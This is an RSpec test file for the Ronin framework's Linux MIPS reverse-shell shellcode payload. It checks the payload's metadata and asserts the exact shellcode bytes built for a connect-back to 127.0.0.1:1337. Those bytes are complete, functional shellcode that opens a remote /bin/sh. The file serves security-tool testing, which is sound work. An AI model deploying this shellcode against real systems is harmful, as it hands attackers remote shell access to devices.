require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/mips/reverse_shell'

describe Ronin::Payloads::Shellcode::Linux::MIPS::ReverseShell do
  it "must inherit from Ronin::Payloads::Shellcode::ReverseShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ReverseShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/mips/reverse_shell'" do
      expect(subject.id).to eq('shellcode/linux/mips/reverse_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :mips" do
      expect(subject.arch).to be(:mips)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  let(:host) { '127.0.0.1' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x24\x0f\xff\xfd\x01\xe0\x20\x27\x01\xe0\x28\x27\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff\x24\x0f\xff\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xe0\x3c\x0e\x05\x39\x35\xce\x05\x39\xaf\xae\xff\xe4\x3c\x0d\x7f\x00\x35\xad\x00\x01\xaf\xad\xff\xe6\x23\xa5\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x24\x0f\xff\xfd\x01\xe0\x28\x27\x8f\xa4\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x20\xa5\xff\xff\x24\x01\xff\xff\x14\xa1\xff\xfb\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
